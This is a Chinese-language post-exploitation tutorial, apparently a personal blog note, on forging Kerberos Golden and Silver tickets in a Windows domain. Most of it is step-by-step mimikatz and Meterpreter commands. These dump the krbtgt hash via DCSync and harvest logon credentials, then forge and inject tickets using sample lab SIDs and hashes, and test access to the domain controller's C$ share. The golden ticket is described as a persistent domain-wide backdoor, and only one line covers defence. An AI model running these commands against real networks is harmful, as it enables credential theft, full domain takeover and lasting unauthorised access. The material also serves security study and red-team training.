---
title: 【后渗透】黄金票据和白银票据
---
## 黄金票据和白银票据

## 黄金票据（Golden Ticket）

> 黄金票据：即伪造的`TGT`票据，当攻击者拥有了高权限的TGT，就可以发送给KDC的TGS 换取`任意Server`的票据（ST）。
>
> 有了金票就有了当前域内的最高控制权限。

金票的**利用原理**是直接跳过了KDC的AS认证过程（AS-REQ、AS-REP通信）。

由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到KDC的TGS，以获取服务票据ST。

伪造的黄金票据是 有效的TGT票据，因为它是由域账号`krbtgt`的`NTLM Hash`加密和签名的。

TGT用于向KDC的TGS服务证明Client已经过AS认证，TGT可以被该域内的任何KDC服务器解密。

**1、导出`krbtgt`的`NTML Hash`**

域管理员权限运行mimikatz（或其它域主机的本地管理员账号密码和域控相同也行）

```bash
mimikatz.exe "lsadump::dcsync /user:krbtgt" exit

#MSF中的hashdump也可以
meterpreter> hashdump
```

**2、获取域中所有用户SID**

应用的时候，去掉SID最后的数字

```bash
#只要是域用户权限就行
wmic useraccount get name,sid
```

**3、制造黄金票据**

**（1）清空现有票据**

```bash
mimikatz.exe "kerberos::purge" exit
```

**（2）生成票据**

```bash
mimikatz.exe "kerberos::golden /admin:Administrator /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /krbtgt:a8424e3f13e1253ea732a5245f2f4266 /ticket:Administrator.kiribi" exit
```

**4、将票据注入内存**

```bash
mimikatz.exe "kerberos::ptt Administrator.kiribi" exit
```

**5、检索当前会话中的票据**

```bash
mimikatz.exe "kerberos::tgt" exit
```

**6、权限验证**

列出域控的C盘

```
dir \\DC\c$
```

**使用meterpreter中的kiwi模块** 

```bash
meterpreter> load kiwi

#创建票据
meterpreter> golden_ticket_create -d wintrysec.lab -u Administrator -s S-1-5-21-1160434164-3042164129-2463410311 -k a8424e3f13e1253ea732a5245f2f4266 -t /tmp/krbtgt.ticket

#注入到内存
meterpreter> kerberos_ticket_use /tmp/krbtgt.ticket

#然后验证权限
dir \\DC\c$
```

> **当拿到域控后，通过伪造黄金票据，可以在域中留下一个畅通全域的后门**
>
> **防御方法：**修改域管理员密码后，同时也要修改`krbtgt`用户的密码

## 白银票据 （Silver Ticket）

> **白银票据**：即伪造的`TGS`票据，也称服务票据ST。
>
> 攻击者通过伪造合法的TGS，可以直接发送给Server，访问指定的某个服务。
>
> 当拥有Server(Service) Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。
>
> Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。
>
> 因此，银票的关键也在于Server的HTLM-Hash

**获取Server（目标服务器）的NTML hash**

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

或MSF模块

```bash
meterpreter > load mimikatz
meterpreter > msv
```

**制造白银票据**

**（1）清空当前系统的票据**

```bash
#使用系统命令
klist purge
```

**（2）伪造票据**

```bash
mimikatz.exe "kerberos::golden /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /target:DC.wintrysec.lab /service:CIFS /rc4:f0e889883425d83b0071e789507b3e6b /user:admin666 /ptt" exit
```

**（3）验证权限**

```
dir \\DC\c$
```

## 黄金票据和白银票据的不同 

**访问权限不同：**

- Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限
- Silver Ticket：伪造TGS，只能访问指定的服务

**加密方式不同：**

- Golden Ticket由Kerberos的Hash加密
- Silver Ticket由服务账号（通常为计算机账户）Hash加密

**认证流程不同：**

- Golden Ticket的利用过程需要访问域控，
- 而Silver Ticket不需要